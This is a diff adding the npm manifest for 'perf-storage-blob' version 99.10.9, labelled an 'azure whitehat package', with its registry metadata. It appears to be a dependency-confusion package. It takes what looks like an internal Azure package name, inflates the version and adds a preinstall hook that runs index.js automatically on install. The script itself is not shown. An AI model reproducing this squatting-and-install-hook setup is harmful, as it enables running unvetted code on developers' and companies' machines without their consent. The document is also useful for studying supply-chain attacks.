@@ -1,0 +1,39 @@
+{
+    "name": "perf-storage-blob",
+    "version": "99.10.9",
+    "description": "azure whitehat package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo \"error no test specified\" && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "perf-storage-blob@99.10.9",
+    "_nodeVersion": "14.16.1",
+    "_npmVersion": "6.14.11",
+    "dist": {
+        "integrity": "sha512-jk2XvdW88AbnE3s7+m7HAq/edfSDdakvh/jGC0fuHfGS7LTwF5QVk+50SmRr8JOY4h0yS7aVvlHlAzC8nq8U2g==",
+        "shasum": "99e6c57cf2b56b0d00413a07398695c60ed75e13",
+        "tarball": "https://registry.npmjs.org/perf-storage-blob/-/perf-storage-blob-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 3581,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v3.0.13\r\nComment: https://openpgpjs.org\r\n\r\nwsFcBAEBCAAQBQJhon9ZCRA9TVsSAnZWagAAamMP/RzSD66aDVV1bRd4F+v4\nlXsQuE4o4IcAwWlYk8l4VxyeYowcOC01dgQVvP5oHGnQVMpUftUtD1LJeV8Q\nSjrx/WIrN1lQhky2MR7+ChPkv4zhDuvW7alN74/Vm2w+Njz8K74hEu+F37oA\nOWz21jMlpEeLbOCEN7lpAW9S0pF+lewgI85cSSTyztGOF4Fd+9ipXDmEBXhX\nKSElzR5ZHNi2DltgTl2bxUNrxMw8JIFVueWZ0IlprNTAdCca45voxKXFKE9L\nr8j22KXm0KPjNDdcqe8c5YG6/OLsHGUgXWv0pSwnhnd4wcbwya23hPXNViwu\nAJDOX53AE0y0czCscyIvMdzwsyx0t/naFvFMG58j6hLlRQW3veqMtw+414HF\noyewlJFbSKTlX7WuwAeZCF+1azO0t3hCbGnfV+gVmhAe92Bc9ZlyEDS7r+Eh\ncr+beqkU1zSVuj1sC3ukHjKVnbsKFvOBuFgStlp2nhoueJRU/aEHdZKEo+F0\nUgXeuKmLH8uWOVLFu7COKb66Mv/kEH1QrCo1rdbRLcPtYpHSgO1jFqGnnBnm\nOto0pTzmTZU89bzqfA1+L+roEypTQz5LF4h1WXXbjzQ4t1DNb4ZRsc9wHgDT\niHlq1ueh9s6NlOYDP8ZsBWh6Vh5SoytAp5V36/kSY7VXkC2ipH5PzUr8D841\nSA2P\r\n=dcBm\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "rt11",
+        "email": "hussam.tes08@gmail.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "rt11",
+            "email": "hussam.tes08@gmail.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/perf-storage-blob_99.10.9_1638039385464_0.5699251730005861"
+    },
+    "_hasShrinkwrap": false
+}
